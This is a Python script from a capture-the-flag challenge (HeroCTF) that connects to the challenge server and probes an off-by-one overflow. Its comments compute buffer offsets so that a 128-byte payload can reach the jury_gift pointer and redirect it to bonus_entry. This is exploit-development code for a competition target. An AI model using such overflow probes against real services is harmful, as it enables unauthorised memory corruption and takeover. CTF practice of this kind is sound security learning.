#!/usr/bin/env python3
import socket
import time
import struct

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect(('dyn06.heroctf.fr', 13683))
    return s

def recv_until(s, text):
    data = b''
    while text not in data:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

# bonus_entry address: 0x4015fc
# Need to write this to jury_gift at 0x4041e0
# last_story is at 0x404160
# Distance: 0x4041e0 - 0x404160 = 0x80 = 128 bytes
# If we copy 127 bytes, null terminator is at 0x404160 + 127 = 0x4041df
# That's 1 byte before jury_gift

# What if there's an off-by-one that allows us to write 128 bytes?
# Or what if we can partially overwrite jury_gift?

def test_off_by_one():
    s = connect()
    time.sleep(0.5)
    
    # Receive menu
    recv_until(s, b'>')
    
    # Submit story
    s.send(b'1\n')
    time.sleep(0.5)
    recv_until(s, b':')
    
    # Try sending length 128 to see if it allows 128 bytes
    s.send(b'128\n')
    time.sleep(0.5)
    recv_until(s, b':')
    
    # Try to write exactly 128 bytes (might overflow into jury_gift)
    # last_story + 127 = null terminator position
    # If we can write 128 bytes, the 128th byte would be at 0x404160 + 128 = 0x4041e0 = jury_gift!
    payload = b'A' * 127 + b'B'  # 128 bytes total
    s.send(payload)
    time.sleep(0.5)
    
    try:
        recv_until(s, b'>')
        
        # Show jury info
        s.send(b'3\n')
        time.sleep(0.5)
        data = recv_until(s, b'>')
        print(data.decode('utf-8', errors='ignore'))
        
        # Try to show results
        s.send(b'4\n')
        time.sleep(0.5)
        data = recv_until(s, b'>')
        print("Results:")
        print(data.decode('utf-8', errors='ignore'))
    except:
        print("Connection closed or timeout")
    
    s.close()

if __name__ == '__main__':
    test_off_by_one()
